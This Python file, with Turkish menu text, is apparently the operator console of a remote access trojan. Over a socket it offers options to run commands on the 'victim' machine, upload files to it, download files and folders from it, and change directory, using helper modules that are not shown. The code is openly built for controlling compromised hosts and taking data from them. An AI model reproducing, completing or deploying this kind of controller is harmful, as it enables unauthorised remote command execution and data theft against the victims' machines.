from core.command import run_command
from core.fileupload import upload_files
from core.file_folder_download import receive_file_folders


def show_options():
    print("\n")
    print("\t \t [ 01 ] Victim makinesinde komut calistir")
    print("\t \t [ 02 ] Victim makinesine dosya yukle")
    print("\t \t [ 03 ] Dosya veya Klasor inidr")
    print("\t \t [ 04 ] Klasor degistir")
    print("\t \t [ 99 ] Cikis Yap")

    print("\n")


def handleConnection(my_socket):
    print("[ + ] Handling connection ")
    while True:
        show_options()
        user_input = input("[ + ]Secim yapiniz")
        my_socket.send_data(user_input)
        if user_input == "1":
            run_command(my_socket)
            print("[+] running command on victims device ")
        elif user_input == "2":
            print("File Incusion")
            upload_files(my_socket)

        elif user_input == "3":
            print("Dosya/Klasor secildi")
            receive_file_folders(my_socket)

        elif user_input == "4":
            my_socket.change_dir()

        elif user_input == "99":
            break
        else:
            print("invalid input")
